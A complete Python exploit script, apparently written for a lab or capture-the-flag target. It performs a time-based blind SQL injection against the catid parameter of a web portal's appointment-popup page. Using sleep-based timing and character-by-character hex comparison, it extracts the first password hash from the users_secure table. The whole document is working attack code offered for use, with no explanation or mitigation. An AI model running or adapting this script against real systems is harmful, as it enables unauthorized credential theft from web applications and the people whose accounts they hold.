#!/usr/bin/python3
import sys
import requests
import string
import time
  
def main(addr):
    session = requests.session()
    check_vuln_url = f"http://{addr}/portal/account/register.php"
    check_vuln = session.get(check_vuln_url).text
    if "Enter email address to receive registration." in check_vuln:
        print('[+] Host Vulnerable. Proceeding exploit')
    url = f"http://{addr}/portal/find_appt_popup_user.php?catid="
    flag = ""
    header = {
        'Referer': check_vuln_url
    }
    password_len = 80
    for i in range(1, password_len):
        for c in "$./" + string.ascii_lowercase + string.ascii_uppercase + string.digits:
            h = hex(ord(c))[2:]
            query = "1' AND HEX(SUBSTR((SELECT password from users_secure LIMIT 0,1), "+ str(i) +",1))='" + h + "' AND sleep(3) -- -"
            start = time.time()
            r = session.get(url+query, headers=header)
            end = time.time()
            if ((end - start) > 2):
                flag += c
                print(flag)
                break
    print(f"[+] Hash:" + flag)

if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
        sys.exit(0)
    main(sys.argv[1])
